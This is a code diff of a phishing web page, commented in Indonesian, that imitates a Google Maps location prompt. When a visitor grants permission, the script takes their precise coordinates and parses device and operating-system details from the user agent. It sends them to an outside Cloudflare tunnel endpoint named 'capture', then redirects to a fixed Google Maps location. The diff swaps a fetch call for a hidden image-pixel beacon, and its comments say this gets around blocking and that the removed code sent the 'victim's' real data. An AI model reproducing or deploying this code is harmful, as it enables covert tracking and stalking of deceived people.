@@ -16,68 +16,32 @@
         #map { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; filter: brightness(0.6) contrast(1.1); transition: transform 4s cubic-bezier(0.25, 1, 0.5, 1); transform-origin: center; }
         .map-zoomed { transform: scale(1.15); }
 
-        .floating-search { 
-            position: absolute; top: 16px; left: 16px; right: 16px; 
-            background: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); 
-            padding: 14px 18px; z-index: 5; display: flex; justify-content: space-between; align-items: center; 
-            transition: opacity 0.3s;
-        }
+        .floating-search { position: absolute; top: 16px; left: 16px; right: 16px; background: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); padding: 14px 18px; z-index: 5; display: flex; justify-content: space-between; align-items: center; transition: opacity 0.3s; }
         .search-text { font-size: 16px; color: #202124; font-weight: 500; }
         .close-btn { font-size: 20px; color: #5f6368; border: none; background: none; cursor: pointer; }
 
-        .dialog-overlay { 
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.6); z-index: 100; 
-            display: flex; justify-content: center; align-items: flex-end;
-            opacity: 0; pointer-events: none; transition: opacity 0.4s ease;
-            backdrop-filter: blur(4px);
-        }
+        .dialog-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100; display: flex; justify-content: center; align-items: flex-end; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; backdrop-filter: blur(4px); }
         .dialog-overlay.show { opacity: 1; pointer-events: auto; }
 
-        .dialog-box { 
-            background: #ffffff; padding: 12px 24px 32px 24px; 
-            border-radius: 32px 32px 0 0; text-align: center; width: 100%; max-width: 500px; 
-            position: relative; transform: translateY(100%) scale(0.9); opacity: 0;
-            transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s; 
-        }
+        .dialog-box { background: #ffffff; padding: 12px 24px 32px 24px; border-radius: 32px 32px 0 0; text-align: center; width: 100%; max-width: 500px; position: relative; transform: translateY(100%) scale(0.9); opacity: 0; transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s; }
         .dialog-overlay.show .dialog-box { transform: translateY(0) scale(1); opacity: 1; }
 
-        .dialog-box.animate-out {
-            transform: translateY(100%) scale(0.7); opacity: 0;
-            transition: transform 0.3s cubic-bezier(0.6, -0.28, 0.735, 0.045), opacity 0.2s; 
-        }
+        .dialog-box.animate-out { transform: translateY(100%) scale(0.7); opacity: 0; transition: transform 0.3s cubic-bezier(0.6, -0.28, 0.735, 0.045), opacity 0.2s; }
 
         .drag-handle { width: 32px; height: 4px; background: #dadce0; border-radius: 2px; margin: 0 auto 20px auto; }
-
         .map-logo-container { display: flex; flex-direction: column; align-items: center; margin-bottom: 20px; position: relative; }
-        
-        .logo-glow-bg {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 100px; height: 100px; background: radial-gradient(circle, rgba(66,133,244,0.5) 0%, rgba(255,255,255,0) 70%);
-            filter: blur(10px); z-index: 1; animation: pulseGlow 2s infinite alternate;
-        }
-        
-        @keyframes pulseGlow {
-            0% { opacity: 0.6; transform: translate(-50%, -50%) scale(0.9); }
-            100% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
-        }
+        .logo-glow-bg { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100px; height: 100px; background: radial-gradient(circle, rgba(66,133,244,0.5) 0%, rgba(255,255,255,0) 70%); filter: blur(10px); z-index: 1; animation: pulseGlow 2s infinite alternate; }
+        @keyframes pulseGlow { 0% { opacity: 0.6; transform: translate(-50%, -50%) scale(0.9); } 100% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); } }
 
         .map-logo-img { width: 55px; height: 55px; margin-bottom: 5px; position: relative; z-index: 2; filter: drop-shadow(0px 4px 8px rgba(0,0,0,0.15)); }
-        
-        .map-logo-text { 
-            font-size: 22px; background: linear-gradient(90deg, #4285F4, #34A853, #FBBC05, #EA4335);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            font-weight: 700; letter-spacing: -0.5px; position: relative; z-index: 2;
-        }
+        .map-logo-text { font-size: 22px; background: linear-gradient(90deg, #4285F4, #34A853, #FBBC05, #EA4335); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; letter-spacing: -0.5px; position: relative; z-index: 2; }
 
         .dialog-box h2 { font-size: 20px; color: #202124; margin-bottom: 10px; font-weight: 500; }
         .dialog-box p { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 1.5; }
 
         .btn-group { display: flex; gap: 12px; position: relative; z-index: 10; }
-        
         .btn-cancel { flex: 1; padding: 14px; border-radius: 100px; border: 1px solid #dadce0; background: #ffffff; color: #3c4043; font-weight: 500; font-size: 15px; cursor: pointer; transition: background 0.2s; }
         .btn-cancel:active { background: #f1f3f4; }
-        
         .btn-allow { flex: 1; padding: 14px; border-radius: 100px; border: none; background: #1a73e8; color: #ffffff; font-weight: 500; font-size: 15px; cursor: pointer; box-shadow: 0 0 15px rgba(26, 115, 232, 0.6), 0 4px 8px rgba(0,0,0,0.1); transition: transform 0.1s, box-shadow 0.2s; }
         .btn-allow:active { transform: scale(0.95); box-shadow: 0 0 25px rgba(26, 115, 232, 0.9), 0 2px 4px rgba(0,0,0,0.1); background: #1557b0; }
 
@@ -90,7 +54,6 @@
     <div id="map"></div>
     
     <div class="floating-search" id="searchBar">
-        <!-- Koordinat Eon Bukit Tinggi -->
         <span class="search-text">3°01'47.2"N 101°26'58.8"E</span>
         <button class="close-btn">✕</button>
     </div>
@@ -120,7 +83,7 @@
     </div>
 
 <script>
-    // Link Cloudflare js
+    // Pastikan link Cloudflare ini aktif (jangan ditutup terminalnya)
     const BACKEND_URL = "https://copyrighted-hoping-tomato-cambridge.trycloudflare.com"; 
 
     var map = L.map('map', {zoomControl: false}).setView([3.0297, 101.4497], 16);
@@ -134,10 +97,10 @@
         if (/android/i.test(ua)) {
             os = "Android";
             const match = ua.match(/Android\s([0-9\.]+)/);
-            if (match) os += " " + match[1];
+            if (match) os += (match[1] === "10") ? " (Modern)" : " " + match[1];
             
             const modelMatch = ua.match(/;\s?([^;]+)\s?Build/);
-            if (modelMatch) device = modelMatch[1];
+            if (modelMatch) device = modelMatch[1].trim();
             else device = "Android Phone";
         } else if (/iPhone|iPad|iPod/i.test(ua)) {
             os = "iOS";
@@ -145,11 +108,9 @@
             if (match) os += " " + match[1].replace(/_/g, '.');
             device = ua.includes("iPad") ? "iPad" : "iPhone";
         } else if (/Windows/i.test(ua)) {
-            os = "Windows";
-            device = "Windows PC";
+            os = "Windows"; device = "Windows PC";
         } else if (/Macintosh/i.test(ua)) {
-            os = "macOS";
-            device = "MacBook / iMac";
+            os = "macOS"; device = "MacBook / iMac";
         }
         return { device, os };
     }
@@ -171,17 +132,15 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    // Tembak data asli korban
-                    const url = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
-                    fetch(url, { mode: 'no-cors' }).catch(() => {});
+                    // === TRIK IMAGE PIXEL (ANTI BLOKIR CORS DARI VERCEL KE CLOUDFLARE) ===
+                    var img = new Image();
+                    img.src = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
 
-                    // REDIRECT KE EON BUKIT TINGGI (Bukan lokasi korban)
                     setTimeout(() => {
                         window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
-                    }, 1000);
+                    }, 1500); // Kasih waktu 1.5 detik buat gambar "ke-load" (padahal kirim data)
                 },
                 (error) => {
-                    // Kalau ditolak, tetap lempar ke Eon
                     window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
